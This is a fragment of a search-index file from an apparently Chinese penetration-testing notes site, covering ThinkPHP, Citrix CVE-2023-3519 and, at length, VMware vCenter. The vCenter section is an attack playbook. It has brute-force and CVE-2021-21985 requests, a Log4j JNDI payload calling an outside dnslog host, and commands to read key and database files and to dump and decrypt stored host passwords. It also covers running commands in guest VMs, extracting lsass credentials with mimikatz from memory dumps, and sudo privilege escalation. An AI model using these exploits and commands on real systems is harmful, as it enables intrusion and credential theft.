5.1.18/","title":"thinkphp"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/thinkphp/thinkphp/#thinkphp","text":"","title":"thinkphp"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/thinkphp/thinkphp/#_1","text":"\u63a2\u6d4b \u7248\u672c \u6e17\u900f \u6f0f\u6d1e\u5e93","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/thinkphp/thinkphp/#_2","text":"","title":"\u63a2\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/thinkphp/thinkphp/#_3","text":"\u968f\u4fbf\u8f93\u5165\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u8def\u7531\u7136\u540e\u67e5\u770b\u9519\u8bef\u4fe1\u606f\u5982http\\://x.x.x.x/gfvhf","title":"\u7248\u672c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/thinkphp/thinkphp/#_4","text":"","title":"\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/thinkphp/thinkphp/#_5","text":"https://wiki.96.mk/Web\u5b89\u5168/Thinkphp/Thinkphp 5.x \u547d\u4ee4\u6267\u884c\u6f0f\u6d1e/Thinkphp 5.1.18/","title":"\u6f0f\u6d1e\u5e93"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/tomcat/tomcat/","text":"tomcat","title":"tomcat"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/tomcat/tomcat/#tomcat","text":"","title":"tomcat"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/","text":"\u865a\u62df\u5316\u8bbe\u5907\uff08\u79c1\u6709\u4e91\uff09 VMware Horizon vmware vcenter ctrix vmware esxi rancher","title":"\u865a\u62df\u5316\u8bbe\u5907\uff08\u79c1\u6709\u4e91\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/#_1","text":"VMware Horizon vmware vcenter ctrix vmware esxi rancher","title":"\u865a\u62df\u5316\u8bbe\u5907\uff08\u79c1\u6709\u4e91\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/VMware%20Horizon/VMware%20Horizon/","text":"VMware Horizon VMware Horizon \u662f\u4e00\u6b3e\u684c\u9762\u4e91(VDI)\u4ea7\u54c1 \u3002\u8bf4\u767d\u4e86\u5c31\u662f\u684c\u9762\u4e91\u3002","title":"VMware Horizon"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/VMware%20Horizon/VMware%20Horizon/#vmware-horizon","text":"VMware Horizon \u662f\u4e00\u6b3e\u684c\u9762\u4e91(VDI)\u4ea7\u54c1 \u3002\u8bf4\u767d\u4e86\u5c31\u662f\u684c\u9762\u4e91\u3002","title":"VMware Horizon"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/ctrix/ctrix/","text":"ctrix \u76ee\u5f55 \u524d\u6e17\u900f \u770b\u7248\u672c cve-2023-3519 \u524d\u6e17\u900f \u770b\u7248\u672c http://127.0.0.1:8088/vpn/pluginlist.xml cve-2023-3519 rce exploits/citrix/CVE-2023-3519 at main \u00b7 assetnote/exploits","title":"ctrix"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/ctrix/ctrix/#ctrix","text":"","title":"ctrix"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/ctrix/ctrix/#_1","text":"\u524d\u6e17\u900f \u770b\u7248\u672c cve-2023-3519","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/ctrix/ctrix/#_2","text":"","title":"\u524d\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/ctrix/ctrix/#_3","text":"http://127.0.0.1:8088/vpn/pluginlist.xml","title":"\u770b\u7248\u672c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/ctrix/ctrix/#cve-2023-3519","text":"rce exploits/citrix/CVE-2023-3519 at main \u00b7 assetnote/exploits","title":"cve-2023-3519"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/rancher/rancher/","text":"rancher","title":"rancher"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/rancher/rancher/#rancher","text":"","title":"rancher"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20esxi/vmware%20esxi/","text":"vmware esxi","title":"vmware esxi"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20esxi/vmware%20esxi/#vmware-esxi","text":"","title":"vmware esxi"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/","text":"vmware vcenter \u76ee\u5f55 \u9ed8\u8ba4\u5bc6\u7801 \u67e5\u770b\u7248\u672c \u5bc6\u7801\u7206\u7834\u63a5\u53e3 rce CVE-2021-21972 CVE-2021-21985 CVE-2021-22005 CVE-2021-44228 log4j\u5bf9vcenter\u7684\u653b\u51fb rce\u540e\u83b7\u53d6web\u63a7\u5236\u53f0\u6743\u9650 \u91cd\u7f6e\u5bc6\u7801 cookie\u767b\u5f55 \u6570\u636e\u5e93\u76f4\u63a5\u89e3\u5bc6\u5bc6\u7801 \u83b7\u53d6web\u63a7\u5236\u53f0\u540e \u83b7\u53d6\u865a\u62df\u673a\u6743\u9650 \u8fdc\u7a0bdump - windows \u5feb\u7167dump - windows linux\u76f4\u63a5\u4fee\u6539\u5bc6\u7801 \u63d0\u6743 CVE-2021-3156 \u96c6\u4e2d\u7ba1\u7406\u865a\u62df\u673a fofa\uff1a title=\"+ ID_VC_Welcome +\" \u865a\u62df\u673a\u7ba1\u7406\u5e73\u53f0 \u9996\u9875\u957f\u8fd9\u6837 \u9ed8\u8ba4\u5bc6\u7801 \u67e5\u770b\u7248\u672c POST /sdk HTTP/1.1 Host: xx Content-Type: application/x-www-form-urlencoded Content-Length: 373 <env:Envelope xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:env=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"> <env:Body> <RetrieveServiceContent xmlns=\"urn:vim25\"> <_this type=\"ServiceInstance\">ServiceInstance</_this> </RetrieveServiceContent> </env:Body> </env:Envelope> \u4e5f\u53ef\u4ee5get\u8bf7\u6c42 https://ip:port/sdk/vimServiceVersions.xml \u5bc6\u7801\u7206\u7834\u63a5\u53e3 POST /ui/certificate-ui/ctrl/vecs/login HTTP/1.1 Host: xx Content-Type: application/json Content-Length: 86 {\"server\":\"localhost\",\"userName\":\"administrator@qiqing.local\",\"password\":\"1qaz!QAZ..\"} \u6ce8\uff1a\u4f7f\u2f64BurpSuite\u7206\u7834\u65f6\uff0c\u56e0\u4e3a\u5bc6\u7801\u6709\u65f6\u4f1a\u6709\u7279\u6b8a\u5b57\u7b26 \uff0c\u4f8b\u5982` ./=<>?+& *;:\"{}|^``\uff0c\u5c06\u4f1a\u88ab URL\u7f16\u7801\u3002\u7206\u7834\u5bc6\u7801\u65f6\u53bb\u6389\u6b64\u9009\u9879: \u8fd4\u56de\u767b\u5f55\u5931\u8d25\u7684\u54cd\u5e94\u5305 rce \u7efc\u5408\u5229\u7528\u5de5\u5177 https://github.com/Schira4396/VcenterKiller (\u6ca1\u6709\u68c0\u6d4b\u529f\u80fd) CVE-2021-21972 vCenter Server7.0 < 7.0.U1c vCenter Server6.7 < 6.7.U3l vCenter Server6.5 < 6.5.U3n /ui/vropspluginui/rest/services/uploadova \u8bbf\u95ee\u4e0a\u9762\u7684\u8def\u5f84\uff0c\u5982\u679c404\uff0c\u5219\u4ee3\u8868\u4e0d\u5b58\u5728\u6f0f\u6d1e\uff0c\u5982\u679c405 \u5219\u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e exp: https://github.com/NS-Sp4ce/CVE-2021-21972 python3 ./CVE-2021-21972.py -url 10.23.2.10 CVE-2021-21985 poc\uff1a\u8fd4\u56de200\u8bf4\u660e\u80fd\u641e # curl -s -k -X $'POST' -H $'Host: <target>' -H $'User-Agent: a' -H $'Content-Type: application/json' -H $'Connection: close' --data-binary $'{\\\"methodInput\\\":[{\\\"type\\\":\\\"ClusterComputeResource\\\",\\\"value\\\": null,\\\"serverGuid\\\": null}]}\\x0d\\x0a' $'https://<target>/ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData' exp\uff1a https://github.com/xnianq/cve-2021-21985_exp \u6216\u8005vcenterkiller CVE-2021-22005 vCenter Server 7.0 < 7.0 U2c build-18356314 vCenter Server 6.7 < 6.7 U3o build-18485166 Cloud Foundation (vCenter Server) 4.x < KB85718 (4.3) Cloud Foundation (vCenter Server) 3.x < KB85719 (3.10.2.2) 6.7 vCenters Windows\u7248\u672c\u4e0d\u53d7\u5f71\u54cd exp: https://github.com/shmilylty/cve-2021-22005-exp CVE-2021-44228 log4j\u5bf9vcenter\u7684\u653b\u51fb GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1 Host: 192.168.121.137 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Dnt: 1 X-Forwarded-For: ${jndi:ldap://9qphlt.dnslog.cn} Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Te: trailers Connection: close xxf\u5934dnslog\u6709\u56de\u663e\u5c31\u6709\u8bf4\u6cd5 \u7136\u540e\u4f7f\u7528jndiexploit\u642d\u5efa\u6076\u610fjndi\u670d\u52a1\u5668\u8fdb\u884c\u653b\u51fb\u3002 https://github.com/WhiteHSBG/JNDIExploit rce\u540e\u83b7\u53d6web\u63a7\u5236\u53f0\u6743\u9650 \u91cd\u7f6e\u5bc6\u7801 \u4f7f\u7528vcenter\u7684admin\u5de5\u5177 #Linux /usr/lib/vmware-vmdir/bin/vdcadmintool #Windows C:\\Program Files\\Vmware\\vCenter Server\\vmdird\\vdcadmintool.exe cookie\u767b\u5f55 \u901a\u8fc7\u89e3\u5bc6\u6570\u636e\u5e93\u767b\u5f55\u83b7\u53d6cookie\uff0c\u518d\u7528cookie\u767b\u5f55web \u6570\u636e\u5e93\u4f4d\u7f6e linux\uff1a/storage/db/vmware-vmdir/data.mdb windows\uff1aC:\\ProgramData\\VMware\\vCenterServer\\data\\vmdird\\data.mdb 1\u3002\u7136\u540e\u7528\u8fd9\u4e2a\u5de5\u5177 https://github.com/horizon3ai/vcenter_saml_login \u83b7\u5f97cookie python vcenter_saml_login.py -p data.mdb -t 10.9.16.11 \u6ce8 windows\u8fd0\u884c\u811a\u672c\u9700\u8981\u5b89\u88c5\u5bf9\u5e94\u7248\u672c\u7684python-ldap\uff0cwindows\u7684data.mdb\u4e00\u822c\u5f88\u5927\u62c9\u56de\u6765\u4e0d\u65b9\u4fbf\uff08\u51e0\u767e\u5146\u5230\u51e0\u4e2aG\uff09 https://www.lfd.uci.edu/~gohlke/pythonlibs/#python-ldap1 pip install python_ldap-3.4.0-cp38-cp38-win_amd64.whl pip install -r requirements.txt 2\u3002\u5982\u679c\u76ee\u6807\u73af\u5883\u6709python\uff0c\u90a3\u5c31\u4e0d\u7528\u62c9\u56de\u6765\u89e3\u5bc6\u4e86\uff0c\u7528\u8fd9\u4e2a\u811a\u672c https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_ExtraCertFromMdb.py \u8fd0\u884c\u540e\u751f\u6210\u4e09\u4e2a\u8bc1\u4e66 \u628a\u4e09\u4e2a\u8bc1\u4e66\u62d6\u56de\u6765\uff08\u53ea\u6709\u51e0k\uff0c\u4e00\u4e0b\u5c31\u62d6\u56de\u6765\u4e86\uff09\uff0c\u7136\u540e\u7528\u8fd9\u4e2a\u811a\u672c\u83b7\u53d6cookie https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_GenerateLoginCookie.py \u8fd9\u4e2a\u811a\u672c\u7684\u53c2\u6570\u5217\u8868 <target> <hostname> <domain> <idp_cert path> <trusted_cert_1 path> <trusted_cert_2 path> \u5176\u4e2ddomain\u53ef\u4ee5\u901a\u8fc7vCenter_ExtraCertFromMdb.py\u811a\u672c\u83b7\u5f97 hostname\u662f\u4e3b\u673a\u540d \u6570\u636e\u5e93\u76f4\u63a5\u89e3\u5bc6\u5bc6\u7801 1\u3002\u83b7\u53d6\u89e3\u5bc6key #Windows type C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\ssl\\symkey.dat #Linux cat /etc/vmware-vpx/ssl/symkey.dat \u628akey\u4fdd\u5b58\u4e0b\u6765 2\u3002\u83b7\u53d6\u6570\u636e\u5e93\u8d26\u6237\u5bc6\u7801 vcenter\u9ed8\u8ba4\u6570\u636e\u5e93\u6587\u4ef6\u5b58\u653e\u5728vcdb.properties\uff0c\u914d\u7f6e\u6587\u4ef6\u4e2d\u6709\u6570\u636e\u5e93\u7684\u660e\u6587\u8d26\u53f7\u5bc6\u7801 #Linux cat /etc/vmware-vpx/vcdb.properties cat /etc/vmware/service-state/vpxd/vcdb.properties #Windows type C:\\ProgramData\\VMware\\\"VMware VirtualCenter\"\\vcdb.properties type C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties 3\u3002\u767b\u5f55\u6570\u636e\u5e93 \u9ed8\u8ba4\u662fpostgresql #psql\u9ed8\u8ba4\u5b58\u653e\u4f4d\u7f6e Windows: C:\\Program Files\\VMware\\vCenter Server\\vPostgres\\bin\\psql.exe Linux: /opt/vmware/vpostgres/9.3/bin/psql #\u6267\u884c\u8bed\u53e5\u67e5\u8be2 psql -h 127.0.0.1 -p 5432 -U vc -d VCDB -c \"select ip_address,user_name,password from vpx_host;\" &gt; password.enc #\u6267\u884c\u5b8c\u4f1a\u8f93\u51fa\u4e00\u6bb5\u52a0\u5bc6\u5b57\u6bb5 Command&gt; shell psql -h 127.0.0.1 -p 5432 -U vc -d VCDB -c \"select ip_address,user_name,password from vpx_host;\" &gt; password.enc Shell access is granted to root Password for user vc: ip_address | user_name | password -------------+-----------+--------------------------------------------------------------------------------------- 192.168.1.1 | vpxuser | *H8BBiGe3kQqaujz3ptZvzhWXXZ0M6QOoOFIKL0p0cUDkWF/iMwikwt7BCrfEDRnXCqxoju4t2fsRV3xNMg== 192.168.1.2 | vpxuser | *zR20RvimwMPHz7U6LJW+GnmLod9pdHpdhIFO+Ooqk0/pn2NGDuKRae+ysy3rxBdwepRzNLdq6+paOgi54Q== 192.168.1.3 | vpxuser | *Q81OIBXziWr0orka0j++PKMSgw6f7kC0lCmITzSlbl/jCDTuRSs07oQnNFpSCC6IhZoPPto5ix0SccQPDw== 192.168.1.4 | vpxuser | *R6HqZzojKrFeshDIP8vXPMhN28mLDHiEEBSXWYXNHrQQvHcuLOFlLquI2oLRfqLiPlHwkmAxUj9hKj3VZA== (4 rows) #\u53ea\u4fdd\u7559password\u5b57\u6bb5 *H8BBiGe3kQqaujz3ptZvzhWXXZ0M6QOoOFIKL0p0cUDkWF/iMwikwt7BCrfEDRnXCqxoju4t2fsRV3xNMg== *zR20RvimwMPHz7U6LJW+GnmLod9pdHpdhIFO+Ooqk0/pn2NGDuKRae+ysy3rxBdwepRzNLdq6+paOgi54Q== *Q81OIBXziWr0orka0j++PKMSgw6f7kC0lCmITzSlbl/jCDTuRSs07oQnNFpSCC6IhZoPPto5ix0SccQPDw== *R6HqZzojKrFeshDIP8vXPMhN28mLDHiEEBSXWYXNHrQQvHcuLOFlLquI2oLRfqLiPlHwkmAxUj9hKj3VZA== \u5982\u679c\u662fmssql\uff0c\u8fd9\u65f6\u5019\u76f4\u63a5\u4f7f\u7528 navicat \u8fdb\u884c\u8fde\u63a5\uff0c\u641c\u7d22 VPX_HOST \u8868 \u5176\u5b83\u6570\u636e\u5e93\u5c31\u7528navicat\u8fde\u6162\u6162\u627e\u5427\uff0c\u5b9e\u6218\u9047\u5230\u518d\u6765\u8865\u5145\u3002 \u53ea\u628apassword\u4fdd\u7559\u4e0b\u6765\u5373\u53ef 4\u3002\u89e3\u5bc6\u5bc6\u7801 https://github.com/shmilylty/vhost_password_decrypt \u7136\u540e\u62ff\u53bb\u767b\u5f55\u5373\u53ef \u83b7\u53d6web\u63a7\u5236\u53f0\u540e \u83b7\u53d6\u865a\u62df\u673a\u6743\u9650 \u8fdc\u7a0bdump - windows https://github.com/RicterZ/PySharpSphere \u4f7f\u7528\u8be5\u5de5\u5177\u5373\u53ef\u76f4\u63a5\u64cd\u63a7vcenter\u4e2d\u7684\u865a\u62df\u673a\uff0c\u5f88\u65b9\u4fbf\u3002 $ pysharpsphere -H 192.168.3.249 -u opsadmin@vsphere.local -p 123QWEasd@ execute -t vm-13 --guest-user administrator --guest-ntlm ccf9155e3e7db453aad3b435b51404ee -c whoami pysharpsphere -H 192.168.100.49 -u administrator@vsphere.local -p password execute -t vm-1020 --guest-user administrator --guest-pass guestpassword -c whoami \u4f46\u662f\u6ca1\u6709\u865a\u62df\u673a\u7684\u5bc6\u7801\u6216\u8005hash\u503c\uff0c\u4e5f\u5c31\u4e0d\u80fd\u5728\u865a\u62df\u673a\u4e2d\u6267\u884c\u547d\u4ee4\u3002 \u8981\u83b7\u53d6\u865a\u62df\u673a\u5bc6\u7801\u6216\u8005hash\u6211\u4eec\u53ef\u4ee5\u628a\u865a\u62df\u673adump\u51fa\u6765 pysharpsphere -H 192.168.100.49 -u administrator@vsphere.local -p password dump -t vm-1020 \u7136\u540e\u4f7f\u7528volatility\u6293\u53bb\u5bc6\u7801\u6216\u8005hash https://www.volatilityfoundation.org/26 #\u83b7\u53d6\u955c\u50cf\u4fe1\u606f\uff1a ./vol -f win2k03-Snapshot1.vmem imageinfo #\u6293hash ./vol -f win2k03-Snapshot1.vmem --profile=Win2003SP1x64 hashdump #\u6293\u53d6\u660e\u6587\u5bc6\u7801-\u5982\u679c\u6709 ./vol -f win2k03-Snapshot1.vmem --profile=Win2003SP1x64 lsadump \u5feb\u7167dump - windows #1\u3001\u5728web\u9875\u9762\u53f3\u952e\u865a\u62df\u673a\u751f\u6210\u865a\u62df\u673a\u5feb\u7167\uff0c\u7136\u540e\u5728\u6570\u636e\u5b58\u50a8\u4e2d\u627e\u5230\u5bf9\u5e94\u7684\u865a\u62df\u673a\u540d\u5b57\u7684\u6587\u4ef6\u5939\u4e0b\u4f1a\u751f\u6210\u4e24\u4e2avmem vmsn\u6587\u4ef6 #\uff1f \u4e5f\u53ef\u4ee5\u76f4\u63a5\u7528\u4e0a\u4e00\u6b65\u7684volatity\u76f4\u63a5dump hash #2\u3001\u7528vss2core \u6574\u5408\u4e24\u4e2a\u6587\u4ef6\uff0c\u51fa\u73b0dump\u6587\u4ef6\uff0c\u628adump\u6587\u4ef6\u62c9\u56de\u6765\u672c\u5730 https://flings.vmware.com/vmss2core vss2core -W 1.vmem 1.vmsn PS\uff1a\u5982\u679c\u76ee\u6807\u662f2012,2016,2019,Windows 8/8.1 \u8bf7\u628a-W \u6539\u6210-W8 #3\u3001\u7136\u540e\u7528windbg preview\u6253\u5f00\uff0c\u6ce8\u610f\u4e00\u5b9a\u8981\u6700\u65b0\u7248win10\u7684\uff0c\u968f\u4fbf\u4e0b\u4e00\u4e2a\u65e7\u7248\u7684\u4e0d\u884c #4\u3001\u5728windbg\u4e0a\u8f7d\u5165mimikatz .load D:\\tmpdump\\mimilib.dll #5\u3001\u5bfc\u51falsass.exe\u7684\u5185\u5b58\u3001\u8fd9\u91cc\u4f1a\u8fd4\u56de\u4e00\u4e2aprocess\u5730\u5740 !process 0 0 lsass.exe #6\u3001\u5230\u5bf9\u5e94\u5185\u5b58\u4f4d\u7f6e\u6267\u884cmimikatz\uff0c\u7136\u540e\u5c31\u4f1a\u51fa\u5bc6\u7801\u4e86 .process /r /p ffffa68274d8a080 !mimikatz linux\u76f4\u63a5\u4fee\u6539\u5bc6\u7801 \u672c\u8d28\u4e0a\u5c31\u662flinux\u5fd8\u8bb0\u5bc6\u7801\u4e86\u600e\u4e48\u529e\uff0c\u6211\u770b\u7f51\u4e0a\u6709\u5f88\u591a\u65b9\u6cd5\u53ef\u4ee5\u641e\u3002\u8fd9\u91cc\u53ea\u8bf4\u4e00\u4e2acentos\u7684\uff0cubuntu\u5565\u7684\u4e5f\u662f\u5927\u540c\u5c0f\u5f02\uff1a https://zhuanlan.zhihu.com/p/145417594 \uff08ubuntu\u5fd8\u8bb0\u5bc6\u7801\u600e\u4e48\u529e\uff09 \u9700\u91cd\u542f\uff0c\u4f46\u53ef\u4ee5\u590d\u5236\u4e00\u4e2a\u518d\u91cd\u542f\uff0c\u4ee5\u514d\u751f\u4ea7\u73af\u5883g\u4e86\u3002 \u5728\u5f00\u673a\u754c\u9762\u6309\u5b57\u6bcde\u8fdb\u5165\u5f15\u5bfc \u5728linux16\u8fd9\u4e00\u884c\u627e\u5230\u201cro\u201d \uff0c\u5c06 \u201cro\u201d \u4fee\u6539\u4e3a \u201d rw init=/sysroot/bin/bash \u201c\uff1b \u7136\u540e\u6309\u4e0bctrl+x\u8fdb\u5165\u6551\u63f4\u6a21\u5f0f\uff0c\u8f93\u5165\u5982\u4e0b\u547d\u4ee4 chroot /sysroot passwd root //\u91cd\u7f6e\u5bc6\u7801 touch /.autorelabel exit reboot -f \u91cd\u542f\u540e\u5c31\u80fd\u62ff\u5bc6\u7801\u767b\u5f55\u4e86 \u63d0\u6743 CVE-2021-3156 \u9002\u7528\u7248\u672c\uff1avCenter 7.0 sudo \u63d0\u6743\u6f0f\u6d1e\u5c06 vsphere-ui \u6743\u9650\u63d0\u5347\u5230 root \u6743\u9650\u3002 https://github.com/worawit/CVE-2021-3156/tree/main Choosing exploit For Linux distributions that glibc has tcache support and enabled (CentOS 8, Ubuntu >= 17.10, Debian 10): try exploit_nss.py first If an error is not glibc tcache related, you can try exploit_timestamp_race.c next For Linux distribution that glibc has no tcache support: if a target is Debian 9, Ubuntu 16.04, or Ubuntu 14.04, try exploit_nss_xxx.py for specific version first next, try exploit_defaults_mailer.py. If you know a target sudo is compiled with --disable-root-mailer, you can skip this exploit. The exploit attempt to check root mailer flag from sudo binary. But sudo permission on some Linux distribution is 4711 (-rws--x--x) which is impossible to check on target system. (Known work OS is CentOS 6 and 7) last, try exploit_userspec.py","title":"vmware vcenter"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/#vmware-vcenter","text":"","title":"vmware vcenter"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/#_1","text":"\u9ed8\u8ba4\u5bc6\u7801 \u67e5\u770b\u7248\u672c \u5bc6\u7801\u7206\u7834\u63a5\u53e3 rce CVE-2021-21972 CVE-2021-21985 CVE-2021-22005 CVE-2021-44228 log4j\u5bf9vcenter\u7684\u653b\u51fb rce\u540e\u83b7\u53d6web\u63a7\u5236\u53f0\u6743\u9650 \u91cd\u7f6e\u5bc6\u7801 cookie\u767b\u5f55 \u6570\u636e\u5e93\u76f4\u63a5\u89e3\u5bc6\u5bc6\u7801 \u83b7\u53d6web\u63a7\u5236\u53f0\u540e \u83b7\u53d6\u865a\u62df\u673a\u6743\u9650 \u8fdc\u7a0bdump - windows \u5feb\u7167dump - windows linux\u76f4\u63a5\u4fee\u6539\u5bc6\u7801 \u63d0\u6743 CVE-2021-3156 \u96c6\u4e2d\u7ba1\u7406\u865a\u62df\u673a fofa\uff1a title=\"+ ID_VC_Welcome +\" \u865a\u62df\u673a\u7ba1\u7406\u5e73\u53f0 \u9996\u9875\u957f\u8fd9\u6837","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/#_2","text":"","title":"\u9ed8\u8ba4\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/#_3","text":"POST /sdk HTTP/1.1 Host: xx Content-Type: application/x-www-form-urlencoded Content-Length: 373 <env:Envelope xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:env=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"> <env:Body> <RetrieveServiceContent xmlns=\"urn:vim25\"> <_this type=\"ServiceInstance\">ServiceInstance</_this> </RetrieveServiceContent> </env:Body> </env:Envelope> 